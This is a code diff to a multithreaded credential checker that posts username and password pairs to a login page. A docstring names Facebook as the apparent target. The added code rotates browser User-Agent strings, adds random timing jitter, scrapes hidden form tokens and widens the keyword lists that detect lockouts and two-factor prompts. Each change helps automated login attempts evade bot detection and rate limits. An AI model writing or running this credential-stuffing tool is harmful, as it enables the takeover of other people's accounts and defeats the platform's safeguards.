@@ -11,6 +11,8 @@ The checker is designed to be run from multiple threads simultaneously.
 
 import json
 import logging
+import random
+import re
 import time
 from dataclasses import dataclass, field
 from enum import Enum
@@ -57,6 +59,26 @@ class TargetConfig:
 # Maximum number of characters captured from a response body for the live viewer.
 _MAX_RESPONSE_BODY = 2000
 
+# Pool of realistic User-Agent strings (latest Chrome / Firefox / Edge on Windows)
+_USER_AGENTS = [
+    # Chrome 124
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    # Chrome 123
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    # Firefox 125
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    # Firefox 124
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    # Edge 124
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+    # Edge 123
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
+    # Chrome on macOS
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    # Safari on macOS
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
+]
+
 # Keywords that indicate a CAPTCHA / rate-limit / lockout response
 _LOCK_KEYWORDS = [
     "captcha",
@@ -67,6 +89,12 @@ _LOCK_KEYWORDS = [
     "rate limit",
     "checkpoint",
     "suspicious activity",
+    "account has been locked",
+    "identity confirmation",
+    "verify your account",
+    "confirm your identity",
+    "we need to verify",
+    "please try again",
 ]
 
 # Keywords that indicate 2-factor authentication is required
@@ -80,21 +108,38 @@ _TWOFA_KEYWORDS = [
     "enter the code",
     "enter code",
     "confirm your identity",
+    "security code",
+    "one-time password",
+    "otp",
+    "approvals",
+    "login approval",
+    "check your phone",
+    "text message",
 ]
+
+# Regex patterns to extract hidden form fields from the login page
+_HIDDEN_FIELD_RE = re.compile(
+    r'<input[^>]+type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
+    re.IGNORECASE,
+)
+_HIDDEN_FIELD_RE2 = re.compile(
+    r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']hidden["\'][^>]*value=["\']([^"\']*)["\']',
+    re.IGNORECASE,
+)
+
+
+def _extract_hidden_fields(html: str) -> Dict[str, str]:
+    """Extract all hidden form input fields from an HTML page."""
+    fields: Dict[str, str] = {}
+    for pattern in (_HIDDEN_FIELD_RE, _HIDDEN_FIELD_RE2):
+        for name, value in pattern.findall(html):
+            if name not in fields:
+                fields[name] = value
+    return fields
 
 
 class CredentialChecker:
     """Performs a single login attempt and returns a :class:`CheckResult`."""
-
-    _DEFAULT_HEADERS = {
-        "User-Agent": (
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-            "AppleWebKit/537.36 (KHTML, like Gecko) "
-            "Chrome/122.0.0.0 Safari/537.36"
-        ),
-        "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate, br",
-    }
 
     def __init__(
         self,
@@ -102,19 +147,57 @@ class CredentialChecker:
         timeout: int = 10,
         retries: int = 2,
         delay: float = 0.5,
+        delay_jitter: float = 0.3,
         proxies: Optional[Dict[str, str]] = None,
     ):
         self.target = target
         self.timeout = timeout
         self.retries = retries
         self.delay = delay
+        self.delay_jitter = delay_jitter
         self.proxies = proxies
 
         self._session = requests.Session()
-        self._session.headers.update(self._DEFAULT_HEADERS)
+        # Rotate User-Agent per checker instance for diversity across threads
+        self._session.headers.update({
+            "User-Agent": random.choice(_USER_AGENTS),
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+        })
+        self._hidden_fields: Dict[str, str] = {}
+        self._prefetch_done = False
+
+    def _prefetch_login_page(self) -> None:
+        """GET the login page to obtain cookies and hidden form fields.
+
+        This mimics a real browser opening the page before submitting
+        credentials and ensures we send the correct hidden fields (lsd,
+        jazoest, etc.) that Facebook requires.
+        """
+        try:
+            resp = self._session.get(
+                self.target.url,
+                timeout=self.timeout,
+                proxies=self.proxies,
+                verify=False,
+                allow_redirects=True,
+            )
+            self._hidden_fields = _extract_hidden_fields(resp.text)
+            logger.debug("Pre-fetched login page; hidden fields: %s", list(self._hidden_fields.keys()))
+        except Exception as exc:
+            logger.debug("Pre-fetch failed: %s", exc)
+        self._prefetch_done = True
 
     def check(self, username: str, password: str) -> CheckResult:
         """Attempt login and return a :class:`CheckResult`."""
+        # Fetch the login page once per checker instance (per-thread) to
+        # obtain cookies and hidden form fields before the first POST.
+        if not self._prefetch_done:
+            self._prefetch_login_page()
+
         for attempt in range(1, self.retries + 2):
             try:
                 result = self._attempt(username, password)
@@ -147,17 +230,22 @@ class CredentialChecker:
                         status=Status.ERROR,
                         detail=str(exc),
                     )
-            if self.delay > 0:
-                time.sleep(self.delay)
+            # Apply delay with optional jitter between retries
+            actual_delay = self.delay + random.uniform(0, self.delay_jitter)
+            if actual_delay > 0:
+                time.sleep(actual_delay)
 
         return CheckResult(username=username, password=password, status=Status.ERROR)
 
     def _attempt(self, username: str, password: str) -> CheckResult:
-        data = {
-            self.target.username_field: username,
-            self.target.password_field: password,
-        }
+        # Start with hidden fields from the pre-fetched page, then override
+        # with any explicitly configured extra_fields, and finally set the
+        # credential fields so they always take precedence.
+        data: Dict[str, str] = {}
+        data.update(self._hidden_fields)
         data.update(self.target.extra_fields)
+        data[self.target.username_field] = username
+        data[self.target.password_field] = password
 
         kwargs = dict(
             url=self.target.url,
@@ -269,3 +357,4 @@ class CredentialChecker:
             response_url=final_url,
             response_body=raw_body,
         )
+
